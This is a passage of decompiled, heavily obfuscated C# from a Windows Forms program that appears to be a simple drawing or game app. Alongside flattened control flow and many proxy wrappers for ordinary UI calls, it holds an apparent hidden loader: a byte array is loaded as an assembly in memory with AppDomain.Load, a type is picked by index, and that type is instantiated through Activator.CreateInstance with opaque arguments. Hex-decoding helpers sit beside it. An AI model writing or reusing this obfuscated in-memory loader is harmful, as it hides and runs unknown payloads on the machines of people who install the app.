					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)(num2 * 1693592394) ^ -1494981627;
					continue;
				case 18u:
					num = ((int)num2 * -2079638618) ^ -309782088;
					continue;
				case 17u:
					num5++;
					num = ((int)num2 * -138292560) ^ 0x6F2270BE;
					continue;
				case 16u:
					timer1 = Form1.smethod_56(components);
					num = (int)(num2 * 391700057) ^ -2074889050;
					continue;
				case 15u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					num = (int)(num2 * 1160773358) ^ -413077993;
					continue;
				case 14u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -842252160) ^ -1924973825;
					continue;
				case 13u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -1539043383) ^ 0x6CE51F82;
					continue;
				case 12u:
					num = (int)(num2 * 1552689272) ^ -944854176;
					continue;
				case 11u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -1594356015) ^ -368878197;
					continue;
				case 10u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -424859457) ^ -1729868187;
					continue;
				case 9u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -587466228) ^ 0x5D4D6598;
					continue;
				case 8u:
				{
					object[] object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					Form1.smethod_70(ComMember, object_);
					num = (int)(num2 * 1669795740) ^ -323963400;
					continue;
				}
				case 7u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)((num2 * 808843153) ^ 0x12026A75);
					continue;
				case 6u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 2016891619) ^ 0x3B0ABA17);
					continue;
				case 5u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1606125061) ^ -1713047639;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 2032656104;
						num4 = 2032656104;
					}
					else
					{
						num3 = 1526132925;
						num4 = 1526132925;
					}
					num = num3 ^ (int)(num2 * 854682420);
					continue;
				}
				case 3u:
					num = ((int)num2 * -1143362062) ^ -442884983;
					continue;
				case 2u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1107698920) ^ 0x34E1BA7C;
					continue;
				case 1u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -340903651) ^ 0x8805F73;
					continue;
				case 0u:
					num = ((int)num2 * -1398124688) ^ 0x6DB23C1D;
					continue;
				default:
					return;
				case 52u:
					break;
				case 59u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -1740519102;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xDED9F865u) % 4u)
				{
				case 3u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = ((int)num2 * -680854617) ^ -1287275131;
					continue;
				case 1u:
					num = (int)(num2 * 452545167) ^ -380753664;
					continue;
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
